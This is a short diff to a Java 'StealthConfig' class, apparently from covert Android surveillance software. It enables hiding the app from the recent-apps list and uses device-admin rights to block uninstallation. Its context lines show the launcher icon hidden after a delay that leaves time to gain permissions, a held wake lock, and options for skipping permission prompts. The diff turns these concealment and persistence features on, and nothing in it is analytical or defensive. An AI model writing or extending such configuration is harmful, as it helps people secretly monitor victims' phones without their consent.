@@ -14,7 +14,7 @@ public class StealthConfig {
     public static boolean HIDE_ICON = true;
     
     // Exclude from recent apps list
-    public static boolean HIDE_FROM_RECENTS = false;
+    public static boolean HIDE_FROM_RECENTS = true;
     
     // Delay before hiding icon (ms) - give time for permissions
     public static int HIDE_DELAY_MS = 3000;
@@ -39,7 +39,7 @@ public class StealthConfig {
     public static boolean WAKE_LOCK = true;
     
     // Request device admin to prevent uninstallation
-    public static boolean UNINSTALL_PROTECTION = false;
+    public static boolean UNINSTALL_PROTECTION = true;
     
     // ═══════════════════════════════════════════════════════════
     // PERMISSION SETTINGS - ADVANCED SKIP OPTIONS
